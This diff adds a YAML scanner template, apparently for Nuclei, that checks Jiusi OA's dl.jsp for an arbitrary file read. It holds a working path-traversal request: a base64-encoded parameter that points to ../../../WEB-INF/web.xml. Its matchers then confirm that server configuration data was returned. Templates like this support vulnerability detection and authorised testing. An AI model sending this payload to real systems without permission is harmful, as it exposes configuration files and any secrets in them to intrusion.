@@ -1,0 +1,29 @@
+id: poc-yaml-jiusi-oa-jsoa-dl-fileread
+info:
+  name: 九思OA dl.jsp 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    九思OA dl.jsp 存在任意文件读取漏洞，通过特定请求路径可以读取敏感的配置文件。
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/jsoa/dl.jsp?JkZpbGVOYW1lPS4uLy4uLy4uL1dFQi1JTkYvd2ViLnhtbCZwYXRoPS9h"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "<param-value>"
+          - "<?xml version"
+          - "<servlet-name>"
+          - "<filter-class>(.*)</filter-class>"
+          - "<servlet-class>(.*)</servlet-class>"
+          - "/WEB-INF/(.*).xml"
+      - type: word
+        words:
+          - "<param-value>"
+        condition: and
